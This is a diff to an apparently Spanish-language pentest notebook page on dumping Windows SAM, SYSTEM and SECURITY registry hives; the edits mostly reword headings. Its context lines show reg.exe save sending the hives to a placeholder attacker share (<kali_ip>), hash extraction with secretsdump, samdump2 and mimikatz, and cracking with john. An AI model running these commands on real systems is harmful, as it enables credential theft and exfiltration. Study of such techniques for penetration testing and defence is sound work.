@@ -37,10 +37,10 @@
 
             <p><code>Hives locales del registro</code></p>
             <p><span class="notebook-review-note">Aviso: Requiere <code>Admin</code> para extraer <code>SAM</code>, <code>SYSTEM</code> y <code>SECURITY</code></span></p>
-            <h2>Dumpear SAM/SYSTEM/SECURITY del DC</h2>
+            <h2>Volcar SAM/SYSTEM/SECURITY</h2>
             <p><code>SAM</code>/<code>SYSTEM</code></p>
             <p><code>SAM</code>: almacena hashes de usuarios locales protegidos.</p>
-            <p><code>SYSTEM</code>: contiene la clave necesaria para descifrar los hashes de <code>SAM</code>.</p>
+            <p><code>SYSTEM</code>: contiene la bootkey necesaria para derivar correctamente los hashes almacenados en <code>SAM</code>.</p>
             <p><code>SECURITY</code></p>
             <p><code>SECURITY</code>: almacena <code>LSA Secrets</code>, como credenciales de servicios, autologon u otros secretos locales.</p>
             <section class="code-card">
@@ -60,13 +60,13 @@ reg.exe save hklm\system &#x27;\\&lt;kali_ip&gt;\recurso\SYSTEM.save&#x27;
 reg.exe save hklm\security &#x27;\\&lt;kali_ip&gt;\recurso\SECURITY.save&#x27;</code></pre>
             </section>
             <section class="code-card">
-              <h3>Dumpear Registros</h3>
-              <pre><code># Dumpear SAM y SECURITY (LSA Secrets)
+              <h3>Volcar registros</h3>
+              <pre><code># Volcar SAM y SECURITY (LSA Secrets)
 impacket-secretsdump -sam SAM.save -system SYSTEM.save -security SECURITY.save LOCAL
-# Dumpear SAM 
+# Volcar SAM 
 impacket-secretsdump -sam SAM.save -system SYSTEM.save LOCAL
 samdump2 SAM.save SYSTEM.save -o sam.txt
-# Dumpear SAM con MimiKatz
+# Volcar SAM con MimiKatz
 lsadump::sam SYSTEM SAM
 # Crackear Hash
 john --format=NT --wordlist=rockyou.txt sam.txt</code></pre>
